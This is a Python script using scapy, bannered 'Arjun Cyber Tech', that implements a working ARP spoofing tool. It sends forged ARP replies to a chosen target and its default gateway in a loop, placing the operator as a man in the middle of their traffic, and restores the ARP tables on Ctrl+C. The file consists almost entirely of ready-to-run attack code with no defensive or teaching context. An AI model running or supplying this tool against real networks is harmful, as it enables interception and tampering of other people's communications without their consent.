#!/usr/bin/python3
import sys

import scapy.all as scapy
import time
import optparse


print(
	'''
   █████████                  ███                                                             
  ███░░░░░███                ░░░                                                              
 ░███    ░███  ████████      █████ █████ ████ ████████                                        
 ░███████████ ░░███░░███    ░░███ ░░███ ░███ ░░███░░███                                       
 ░███░░░░░███  ░███ ░░░      ░███  ░███ ░███  ░███ ░███                                       
 ░███    ░███  ░███          ░███  ░███ ░███  ░███ ░███                                       
 █████   █████ █████         ░███  ░░████████ ████ █████                                      
░░░░░   ░░░░░ ░░░░░          ░███   ░░░░░░░░ ░░░░ ░░░░░                                       
                         ███ ░███                                                             
                        ░░██████                                                              
                         ░░░░░░                                                               
   █████████             █████                        ███████████                   █████     
  ███░░░░░███           ░░███                        ░█░░░███░░░█                  ░░███      
 ███     ░░░  █████ ████ ░███████   ██████  ████████ ░   ░███  ░   ██████   ██████  ░███████  
░███         ░░███ ░███  ░███░░███ ███░░███░░███░░███    ░███     ███░░███ ███░░███ ░███░░███ 
░███          ░███ ░███  ░███ ░███░███████  ░███ ░░░     ░███    ░███████ ░███ ░░░  ░███ ░███ 
░░███     ███ ░███ ░███  ░███ ░███░███░░░   ░███         ░███    ░███░░░  ░███  ███ ░███ ░███ 
 ░░█████████  ░░███████  ████████ ░░██████  █████        █████   ░░██████ ░░██████  ████ █████
  ░░░░░░░░░    ░░░░░███ ░░░░░░░░   ░░░░░░  ░░░░░        ░░░░░     ░░░░░░   ░░░░░░  ░░░░ ░░░░░ 
               ███ ░███                                                                       
              ░░██████                                                                        
               ░░░░░░                                                                         

    '''
)

def get_argument():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP for spoof")
    parser.add_option("-g", "--getway", dest="getway_ip", help="Default getway")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please Specify an target ip, use --help for more info.")  # code to handle error
    elif not options.getway_ip:
        parser.error("[-] Please Specify a Default getway, use --help for more info.")  # code to handle error
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_brodcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_brodcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_argument()
try:
    sent_packet_count = 0
    while True:
        spoof(options.target_ip, options.getway_ip)
        spoof(options.getway_ip, options.target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] packets Sent: " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...... Resting ARP tables ....... Please Wait")
    restore(options.target_ip, options.getway_ip)
    restore(options.getway_ip, options.target_ip)
